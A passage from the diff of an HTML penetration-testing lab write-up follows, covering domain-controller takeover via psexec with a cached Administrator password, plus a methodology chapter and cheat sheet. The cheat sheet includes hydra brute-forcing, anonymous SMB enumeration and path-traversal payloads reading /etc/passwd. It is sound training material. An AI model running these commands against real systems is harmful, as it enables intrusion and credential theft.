+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.10.131.148
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ntpdig: no eligible servers</span></pre></div>
+<p><code>ntpdate</code> is <code>ntpdig</code> on this Kali, and MS02 is not offering time service on the query port. With
+the target unreachable as a time source, the clock was moved by hand:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>date<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>date<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;+0 hour 26 minutes 04 seconds&#39;</span><span class="w"> </span><span class="s1">&#39;+%Y-%m-%d %H:%M:%S&#39;</span><span class="k">)</span><span class="s2">&quot;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Wed Nov 25 09:21:36 PM PST 2026</span></pre></div>
+<p>That aligns Kali with the host to within a few seconds. It is a lab workaround, not a fix: the
+clock will drift again, and on a real engagement setting the system time by hand can break
+tickets, logs and file timestamps in ways that are harder to diagnose than the skew. Prefer a
+reachable NTP source, or correct only the offset when the tooling allows it.</p>
+<hr />
+<h3>11.4 Why MS02 was not the way in</h3>
+<p>MS02 was reachable, enumerated, and left alone. That is not an oversight — the credential that
+finishes the set was already in hand:</p>
+<ul>
+<li>the DCC2 entry in chapter 09 is the <strong>domain</strong> Administrator, so it applies to DC01 directly;</li>
+<li>MS02 exposed no SQL service and no credential of ours was known to work there;</li>
+<li>attacking MS02 would have added a hop, not removed one.</li>
+</ul>
+<p>Pass 2 reached the opposite conclusion for a different position: with DC01 direct, MS02 was the
+only host whose token could be escalated, so <code>sql_svc</code> was the plan. Here the plan is unnecessary
+— and that is the useful comparison. The "second hop" is not always on the path.</p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Address</th>
+<th>State after this chapter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01</td>
+<td><code>10.10.131.147</code></td>
+<td>SYSTEM, local admin add in place</td>
+</tr>
+<tr>
+<td>MS02</td>
+<td><code>10.10.131.148</code></td>
+<td>reachable · enumerated · <strong>not attacked</strong></td>
+</tr>
+<tr>
+<td>DC01</td>
+<td><code>10.10.131.146</code></td>
+<td>not contacted yet — credential in hand</td>
+</tr>
+</tbody>
+</table>
+<p>DC01 is next.</p></div></section>
+<section class="chapter" id="ch-12" data-title="DC01: proof.txt"><div class="ch-head"><span class="ch-num">12</span><div class="ch-title"><h2>DC01: proof.txt</h2><p class="ch-sub">The cached credential is domain-tier</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The password recovered from MS01's DCC2 cache is used here for the first time. It authenticates
+to the domain controller as the built-in Administrator and returns a SYSTEM shell — which is the
+end of the set.</p>
+<hr />
+<h3>12.1 The login</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-psexec<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span>:<span class="s1">&#39;7Tg9M9MZbzAokR9&#39;</span>@10.10.131.146
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+PS C:\Users\Administrator\Desktop&gt; whoami
+nt authority\system</span></pre></div>
+<p>The scrollback jumps from the Impacket banner to the shell prompt; the service-creation lines
+<code>psexec</code> prints in between are not in this capture.</p>
+<p><code>psexec</code> uploads a service binary to <code>ADMIN$</code>, registers it as a service, starts it, and the
+service runs as <code>SYSTEM</code>. It is noisy — service creation, a file on disk, an event log entry —
+but on a DC with a working administrative credential it is reliable.</p>
+<hr />
+<h3>12.2 Why <code>Administrator</code> here is the domain account</h3>
+<p>On a domain controller there is no separate local <code>Administrator</code>: the built-in account is the
+domain's built-in Administrator (<code>S-1-5-21-…-500</code>). A logon as <code>Administrator</code> on DC01 is
+therefore a <strong>domain</strong> logon, not a local one.</p>
+<p>The password did not come from DC01. It came from the <code>OSCP.EXAM/Administrator</code> DCC2 entry in
+MS01's <code>SECURITY</code> hive (chapter 09), left there by an interactive domain-administrator logon in
+2022. That is the boundary the cache crossed: a member server kept a verifier for the domain
+Administrator, and a local administrator on that member server could read it.</p>
+<hr />
+<h3>12.3 The flag, attributable</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">ls</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/25/2026   7:49 PM             70 proof.txt</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cat </span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">f6a8a664f1a84134905200191b7ee464</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">ipconfig</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Windows IP Configuration
+
+Ethernet adapter tap53be1893-d6:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::f1ff:ca80:9de1:9a2c%23
+   IPv4 Address. . . . . . . . . . . : 10.10.131.146
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.131.254</span></pre></div>
+<p>The value alone would be a string. Tied to <code>whoami</code> (<code>nt authority\system</code>) and <code>ipconfig</code>
+(<code>10.10.131.146</code>, the DC) in the same session, it is evidence of <em>where</em> and <em>as whom</em> it was
+read.</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Identity</td>
+<td><code>nt authority\system</code></td>
+</tr>
+<tr>
+<td>Host</td>
+<td><code>10.10.131.146</code> (DC01)</td>
+</tr>
+<tr>
+<td>File</td>
+<td><code>C:\Users\Administrator\Desktop\proof.txt</code></td>
+</tr>
+<tr>
+<td>Flag</td>
+<td><code>f6a8a664f1a84134905200191b7ee464</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3>12.4 What is proven — and what is not</h3>
+<p><strong>Proven.</strong> A credential recovered from MS01's cached domain logons authenticates to DC01 as the
+built-in domain Administrator and yields <code>SYSTEM</code>; the flag was read in that session.</p>
+<p><strong>Not done.</strong> No <code>DCSync</code> of <code>krbtgt</code>, no golden ticket, no persistence. The set ends at the flag;
+domain control is demonstrated by the logon, not by extracting the directory database.</p>
+<p><strong>Not tested.</strong> Whether the same password works on MS02, or anywhere else in the range. The
+domain Administrator would be expected to, but this pass did not try.</p>
+<hr />
+<h3>12.5 Status of the set</h3>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Address</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01</td>
+<td><code>10.10.131.147</code></td>
+<td><strong>SYSTEM</strong> — PrintSpoofer, local-admin add</td>
+</tr>
+<tr>
+<td>MS02</td>
+<td><code>10.10.131.148</code></td>
+<td>reachable, enumerated, <strong>not attacked</strong></td>
+</tr>
+<tr>
+<td>DC01</td>
+<td><code>10.10.131.146</code></td>
+<td><strong>SYSTEM</strong> — <code>proof.txt</code> read</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Objective</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Local admin on MS01</td>
+<td>yes (<code>Administrator:December31</code>, and <code>eric.wallows</code> added)</td>
+</tr>
+<tr>
+<td>Domain admin</td>
+<td><strong>yes</strong> — built-in Administrator on DC01</td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td><strong>read</strong> — <code>f6a8a664f1a84134905200191b7ee464</code></td>
+</tr>
+<tr>
+<td>MS02 owned</td>
+<td>no — and not needed</td>
+</tr>
+</tbody>
+</table>
+<p>Cleanup is not shown: <code>eric.wallows</code> is still in MS01's local <code>Administrators</code>, and the ligolo
+agent is still running. <code>psexec</code>'s service is transient by design, but the capture does not show
+it being removed either.</p>
+<hr />
+<h3>12.6 What this pass changes about the page</h3>
+<p>Pass 2 ended with a plan: roast <code>sql_svc</code>, because MS02's token held nothing and the directory
+had no writable edges. That plan was correct <strong>for that position</strong>. This pass never ran it,
+because a shorter path existed:</p>
+<ol>
+<li><code>SeImpersonate</code> on MS01 gives SYSTEM, and SYSTEM can read the registry.</li>
+<li>The <code>SECURITY</code> hive keeps cached domain logons — a store LSASS triage does not see.</li>
+<li>A domain administrator had logged on to MS01 in 2022, so the cache held the domain
+   Administrator's verifier.</li>
+<li>A local-admin add on MS01 is enough to dump it remotely.</li>
+<li>The credential works on DC01 directly; MS02 never has to fall.</li>
+</ol>
+<p>The general lesson is not "kerberoast is wrong" — it is that <strong>credential stores are plural</strong>.
+LSASS is the one everyone checks. <code>SECURITY</code>'s DCC2 cache, LSA secrets and unattended-install
+passwords are on the same host, behind the same administrator rights, and on a member server they
+are often worth more.</p></div></section>
+<section class="chapter" id="ch-13" data-title="Methodology"><div class="ch-head"><span class="ch-num">13</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
 deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
 where evidence points.</p>
 <hr />
@@ -1394,7 +2088,7 @@ this version?" Version CVEs come last — most boxes are misconfigured, not unpa
 </pre></div>
 <p>If <code>161/udp</code> is open:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 </pre></div>
 <p>Then, on success, always:</p>
@@ -1411,7 +2105,7 @@ Descriptions are written for an internal audience and routinely name accounts an
 <h4>HTTP/HTTPS</h4>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
 <span class="k">done</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
@@ -1422,7 +2116,7 @@ feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class=
 <li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
 </ul>
 <h4>FTP</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
 </pre></div>
 <p>Try the account name as the password. Check for key material, configs, and backups in the data
@@ -1432,8 +2126,8 @@ directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> ac
 ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
 </pre></div>
 <h4>SMB</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
 nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 </pre></div>
 <hr />
@@ -1446,7 +2140,7 @@ escalation path depends on it.</p>
 <hr />
 <h3>Phase 5 — Local enumeration (Linux)</h3>
 <p>Send one script over one connection and read one report:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <p>Checklist, in the order that finds things:</p>
 <table>
@@ -1516,8 +2210,8 @@ escalation path depends on it.</p>
 <h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
 </pre></div>
 <p>What you are looking for, in priority order:</p>
 <ol>
@@ -1578,7 +2272,7 @@ with its output. Then clean up.</p>
 </table>
 <p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
 have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
-<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<section class="chapter" id="ch-14" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">14</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
 <hr />
 <h3>Scanning</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
@@ -1591,13 +2285,13 @@ nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </spa
 nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
 
 <span class="c1">## live hosts</span>
-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
 </pre></div>
 <hr />
 <h3>SNMP</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
 <span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 
 <span class="c1">## full walk to a file, then grep it</span>
@@ -1610,7 +2304,7 @@ snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </
 snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
 
 <span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
 
 <span class="c1">## bulk walk when v1 is slow</span>
 snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
@@ -1618,27 +2312,27 @@ snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w
 <hr />
 <h3>Web</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
-curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
 
 <span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
 
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
 
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
 </pre></div>
 <hr />
 <h3>FTP</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
